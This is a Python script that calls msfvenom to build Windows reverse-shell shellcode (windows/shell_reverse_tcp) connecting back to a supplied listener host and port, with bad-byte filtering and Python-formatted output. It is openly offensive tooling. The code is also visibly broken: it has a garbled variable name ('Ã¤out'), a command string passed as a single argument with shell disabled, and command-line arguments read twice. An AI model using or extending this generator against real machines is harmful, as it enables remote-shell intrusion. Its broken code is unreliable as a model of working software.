import argparse
import sys
import subprocess

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

class PAYLOAD():

    def __init__(self,TCP_IP,TCP_PORT):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT


    def oscmd(self, cmd):

        p = subprocess.Popen(
            cmd, shell=False,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        return stdout.decode(), stderr.decode()

#    p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def generec_reverse_shell(self):
        desc="Generic Send TCP"
        print('[*] Generic Send TCP')
        msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o spastivanKlako'.format(
            self.TCP_IP, self.TCP_PORT)
        Ã¤out, err = self.oscmd([msfvenom_string])
        print("[*] Generating shellcode:\n    %s" % msfvenom_string)
        p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()

    def run(self):
        self.generec_reverse_shell()


# Generate Shellcode
#msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o shellcode' % (LHOST, LPORT)
#msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o shellcode'.format(self.TCP_IP, self.TCP_PORT)




#p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#out, err = p.communicate()



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    args = parser.parse_args()
    sm = PAYLOAD(args.TCP_IP, args.TCP_PORT)
    sm.run()